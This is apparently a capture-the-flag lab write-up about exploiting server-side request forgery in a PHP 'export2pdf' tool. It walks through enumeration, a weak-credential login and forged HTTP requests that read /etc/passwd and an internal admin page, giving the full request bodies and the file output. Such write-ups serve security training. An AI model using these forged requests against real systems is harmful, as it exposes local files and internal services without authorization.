## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
Surf some internal webpages to find the flag!
```
## IP-Address
```IP-Address
10.49.165.118
```
## Enumeration
```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b8:75:31:99:79:fd:67:2c:3e:82:f6:14:69:c9:64:fc (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCiAvgbPSS8sfwS3iV+zOPiud76aKPOGfcRq/Yw0wa7lx3fycmsxzaamwiPwcFGyl1msNiDkZuKzpC2tC2Ib2xjBDBb+cZXajb+Le29i63TudQDgFdCESPnLUeoQIVEOcYcp7hWLd1p4pbVN+qn5Mdj6rFRdxViiEOmO2Le+BQ0gzH3EJZzvttywf63zj8aYKAnvR6RVAynJuqmoGkBM+gp+lXK8e7SNd2iZDLwVk0TfOHDYarZCBOkVVtEoyJxM08TN2Z/FfEvYYy9VMiTOPqDyAtux69n+woc6DhCasvVwZiHr5YLpCvctU1RZ0Iqsbd79wFLBhS8t7nhO/ZB9AOfe7Rle6x27dNjtdJ3xAuESofgBSrgXYFjGiEfBmAn975BjLV7V+GKiV0KN0H0XRZtpVhZHIA1Lc5xDkWdsh1fSikYD4PffOOkDQILsiHVu2t8r06JpShgfw49w4vizD6UJ2zXbx865ECVX7V+0vUsegk3/53714UR5IyXFuKE6/s=
|   256 6b:f8:e9:5c:5d:1b:35:19:f4:19:2a:68:9d:4e:2a:5c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBF351URGjxB1wpkG7n/eEAnxKVNtZswZ+EmFKyqm/b08O9SjliC2V24nZp6XLDfDVBsys8tsBHAYoRtuzzQfOZs=
|   256 75:3d:b7:9a:81:b9:e5:74:8b:b2:f0:90:49:f6:4d:91 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHMccXuA1Me2ImTOF/Bk3+JP/uhQ+CW/TedJu3wtizAp
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.38 ((Debian))
|_http-favicon: Unknown favicon MD5: CFFCD51EFA49AB1AC1D8AC6E36462235
| http-title: 24X7 System+
|_Requested resource was /login.php
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.38 (Debian)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry
|_/backup/chat.txt
```
- Port 80 Shows 2 Important files 
```http
- Robots.txt 
  User-Agent: *
  Disallow: /backup/chat.txt
  
- /backup/chat.txt
  
Admin: I have finished setting up the new export2pdf tool.
Kate: Thanks, we will require daily system reports in pdf format.
Admin: Yes, I am updated about that.
Kate: Have you finished adding the internal server.
Admin: Yes, it should be serving flag from now.
Kate: Also Don't forget to change the creds, plz stop using your username as password.
Kate: Hello.. ?
```
- Creds
```Creds 
username = Password 
- [password omitted]
  username - admin
  password - [password omitted]
Got the access
```
- Important 
```Points
- There is an new tool likely export2pdf
```
## Burp 
- Using Intercept - Got the Endpoint 
- Confirm #SSRF 
- Original `REQUEST`
```REQ
POST /export2pdf.php HTTP/1.1
Host: 10.49.165.118
Content-Length: 22
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36
Origin: http://10.49.165.118
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.8
Referer: http://10.49.165.118/index.php
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=9aea4e9556105db9704c86d7ecf27bd1
If-Modified-Since: Fri, 01 May 2026 12:52:07 GMT
Connection: close
url=http%3A%2F%2F127.0.0.1%2Fserver-info.php
```
--- 
#### Forge REQ
```Req
POST /export2pdf.php HTTP/1.1
Host: 10.49.165.118
Content-Length: 22
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36
Origin: http://10.49.165.118
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.8
Referer: http://10.49.165.118/index.php
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=9aea4e9556105db9704c86d7ecf27bd1
If-Modified-Since: Fri, 01 May 2026 12:52:07 GMT
Connection: close
url=file:///etc/passwd
```
- Output Rendered on `PDF`
```bash
Report generated for file:///etc/passwd
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats
Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
Powered by TCPDF (www.tcpdf.org)
```
- And Looking at the `Activity` on `Dashboard` - I Got this
```bash
Recent Activity | Today
|
System Stats Report Generated.
|
Recovered from unexpected downtime.
|
System Stats Report Generated.
|
Internal pages hosted at /internal/admin.php. It contains the system flag.
|
System Stats Report Generated.
|
24X7 System+ Installed on the server.
```
- Flag `REQ`
```REQ
POST /export2pdf.php HTTP/1.1
Host: 10.49.165.118
Content-Length: 44
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36
Origin: http://10.49.165.118
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.8
Referer: http://10.49.165.118/index.php
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=9aea4e9556105db9704c86d7ecf27bd1
If-Modified-Since: Fri, 01 May 2026 13:43:47 GMT
Connection: close
url=http%3A%2F%2F127.0.0.1%2Finternal/admin.php
```
## Flag
```bash
Report generated for http://127.0.0.1//internal/admin.php
[flag omitted]
```
- Flag
```Flag
[flag omitted]
```
# END